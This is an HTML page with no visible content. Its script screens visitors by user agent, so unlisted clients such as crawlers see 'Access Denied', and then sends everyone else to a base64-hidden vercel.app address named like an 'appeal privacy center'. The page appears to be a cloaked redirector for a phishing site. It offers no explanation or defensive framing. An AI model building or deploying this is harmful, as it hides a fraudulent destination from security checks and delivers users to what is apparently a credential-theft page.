<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title></title>

<script>
// ---------------------- ALLOWED DEVICES ----------------------
const allowList = [
  /android/i,
  /windows/i,
  /iphone/i,
  /ipad/i,
  /mac os/i
];

// Check device
const ua = navigator.userAgent.toLowerCase();
const isAllowed = allowList.some(r => r.test(ua));

if (!isAllowed) {
  document.body.innerHTML = `
    <div style="font-family:sans-serif;text-align:center;margin-top:40vh;">
      <h2>Access Denied</h2>
      <p>Your device is not supported.</p>
    </div>`;
  throw new Error("Device not allowed");
}


const encodedURL = "aHR0cHM6Ly9hcHBlYWwtcHJpdmFjeS1jZW50ZXItMjEudmVyY2VsLmFwcA==";

window.location.href = atob(encodedURL);

</script>
</head>

<body style="font-family:sans-serif;">
  <p></p>
</body>
</html>
